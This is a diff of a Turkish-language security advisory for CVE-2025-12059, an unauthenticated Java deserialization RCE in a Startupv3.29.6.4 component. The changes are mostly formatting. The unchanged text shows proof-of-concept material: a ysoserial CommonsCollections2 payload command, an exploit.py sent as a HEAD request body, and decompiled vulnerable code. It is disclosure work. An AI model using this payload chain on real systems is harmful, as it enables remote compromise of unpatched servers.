@@ -1,15 +1,11 @@
 ---
 title: "CVE-2025-12059"
-description: "CWE-502"
+description: "CWE-502 - 538"
 ---
 
-**Date:** 2025-10-04\
-**Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)\
-AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\
-**Etki Kapsamı:**`Startupv3.29.6.4`\
-Sınıflar: `com.lbs.start.JLbsStartup`, `com.lbs.start.SocketToken`
+**Date:** 2025-10-04<br />**Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)<br />AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<br />**Etki Kapsamı:**`Startupv3.29.6.4`<br />Sınıflar: `com.lbs.start.JLbsStartup`, `com.lbs.start.SocketToken`
 
-https://www.cve.org/cverecord?id=CVE-2025-12059
+[https://www.cve.org/cverecord?id=CVE-2025-12059](https://www.cve.org/cverecord?id=CVE-2025-12059)
 
 Uygulama, JNLP dosyasında yer alan `DOCUMENT_URI` parametresini istemci sunucu akışında kullanıyor ve bu URI/uç nokta üzerinden dönen istek gövdesini HTTP metodu ne olursa olsun (HEAD dahil) okuyup `ObjectInputStream.readObject()` ile deserialize ediyor. Sonuç olarak saldırgan, kimlik doğrulaması olmadan bile **serialized** bir gövdeyi `HEAD` isteğiyle taşıyıp sunucu tarafında gadget zincirini tetikleyebiliyor ve RCE elde edebiliyor. Bu davranış, HTTP standardında HEAD yanıt gövdesinin olmamasıyla karıştırılabiliyor ancak **istek** gövdesi uygulama katmanında yanlış tasarımla okunuyorsa, HEAD de dahil olmak üzere metot agnostik bir akış ortaya çıkıyor ve deserialize zinciri aynı şekilde çalışıyor.
 
@@ -27,13 +23,11 @@ Kimlik doğrulaması olmadan, ağ üzerinden uzaktan kod çalıştırma mümkün
 1. `http://xx.xxx.xx.xxx:xxxx/xxxx/xxxx/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
 2. JNLP içinde ana bileşenler` Startupv3.29.6.4` gibi JAR’lara işaret ediyor.
 3. `Startupv3.29.6.4 `JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
-4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 + TemplatesImpl + `Runtime.exec` **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.
+4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 \+ TemplatesImpl \+ `Runtime.exec` **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.
 
 ## Teknik kanıt
 
-runapp.jnlp içeriğinden doğruca startup.jar dosyasına yönlendirme var, ilgili linke gidip jar dosyasını sistemimde decode edip analiz ettim.\
-\
-JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectInputStream.readObject()` çağrıları gelen socket üzerinde doğrudan `readObject()` çağırıyor.
+runapp.jnlp içeriğinden doğruca startup.jar dosyasına yönlendirme var, ilgili linke gidip jar dosyasını sistemimde decode edip analiz ettim.<br /><br />JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` \+ `ObjectInputStream.readObject()` çağrıları gelen socket üzerinde doğrudan `readObject()` çağırıyor.
 
 ```java
 /* 211 */     listenThread = new Thread(new Runnable()
@@ -84,9 +78,7 @@ JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectIn
 ```
 
 - Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
-- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.\
-  \
-  exploit.py // HEAD ile tetikleme
+- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.<br /><br />exploit.py // HEAD ile tetikleme
 
 ```python exploit.py
 import requests
@@ -125,8 +117,7 @@ java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
      -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
 ```
 
-**DOCUMENT_URI ne yapıyor?** JLbsStartup içinde JNLP parametresi `DOCUMENT_URI` okunup uygulama/applet’e `setDocumentURI(String)` ile aktarılıyor. Yani bu parametre, istemci tarafındaki ana bileşene “sunucuya hangi endpoint üzerinden bağlanacağını / doküman servisinin nerede olduğunu” bildiriyor. Dosyanın içinde bu akış net: satır ~**524**’te `getParameter("DOCUMENT_URI")` alınıyor, hemen ardından yansımayla `setDocumentURI(...)` çağrılıyor \
-`JLbsStartup.java` içinde tespit edilen bölüm:
+**DOCUMENT\_URI ne yapıyor?** JLbsStartup içinde JNLP parametresi `DOCUMENT_URI` okunup uygulama/applet’e `setDocumentURI(String)` ile aktarılıyor. Yani bu parametre, istemci tarafındaki ana bileşene “sunucuya hangi endpoint üzerinden bağlanacağını / doküman servisinin nerede olduğunu” bildiriyor. Dosyanın içinde bu akış net: satır ~**524**’te `getParameter("DOCUMENT_URI")` alınıyor, hemen ardından yansımayla `setDocumentURI(...)` çağrılıyor <br />`JLbsStartup.java` içinde tespit edilen bölüm:
 
 ```java
 /*     */         try {
@@ -210,20 +201,13 @@ Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned kla
 
 ### Hashler
 
-Payload.ser\
-SHA-256 Hash: 3d302311134368d4fd6bd5e3ca6703510608bae3a0856281b11415dba952bff5\
-Boyut: 4.096\
-\
-Startupv3.29.6.4.jar\
-SHA-256 Hash: d1b18391d76822a61a0434d47334d64d56471e1e2d89cd8e1962dfea16b96004\
-boyut: 200.704
+Payload.ser<br />SHA-256 Hash: 3d302311134368d4fd6bd5e3ca6703510608bae3a0856281b11415dba952bff5<br />Boyut: 4.096<br /><br />Startupv3.29.6.4.jar<br />SHA-256 Hash: d1b18391d76822a61a0434d47334d64d56471e1e2d89cd8e1962dfea16b96004<br />boyut: 200.704
 
 ## Deserialization Kaynaklı RCE Nasıl Oluşur.
 
 ![Ekrangörüntüsü2025 11 01220812 Pn](/images/Ekrangörüntüsü2025-11-01220812.png)
 
-Obje sınıfı ilk anlattığım gibi `readObject() / ObjectInputStream`  gibi objeler olabilir, obje oldukça masumane bir şekilde ilgili sisteme veri getir götür işlemlerini yaparken, burada zafiyet olduğunu tespit eden Kötü Niyetli Saldırgan kişisi `A` olayında olduğu gibi, olan veriyi Serileştirerek içeriye sokar.\
-`B `olayında ise eğer kötü niyetli saldırgan serileştirilmiş veriyi gönderebilirse deserialization dediğimiz olay gerçekleşir ve sistem içeride bu veriyi seri durumdan çıkarır ve sistemi içeriye sokar. `C` olayında ise artık saldırganın içeride komut çalıştırmasının önünde bir engel kalmaz.
+Obje sınıfı ilk anlattığım gibi `readObject() / ObjectInputStream`  gibi objeler olabilir, obje oldukça masumane bir şekilde ilgili sisteme veri getir götür işlemlerini yaparken, burada zafiyet olduğunu tespit eden Kötü Niyetli Saldırgan kişisi `A` olayında olduğu gibi, olan veriyi Serileştirerek içeriye sokar.<br />`B `olayında ise eğer kötü niyetli saldırgan serileştirilmiş veriyi gönderebilirse deserialization dediğimiz olay gerçekleşir ve sistem içeride bu veriyi seri durumdan çıkarır ve sistemi içeriye sokar. `C` olayında ise artık saldırganın içeride komut çalıştırmasının önünde bir engel kalmaz.
 
 <Danger>
   **Bu çalışma yalnızca güvenlik araştırması ve farkındalık amacıyla yapılmıştır. İlgili kurum bilgilendirilmiş, güvenlik açığı kapatılana kadar exploit detayları paylaşılmamıştır.**
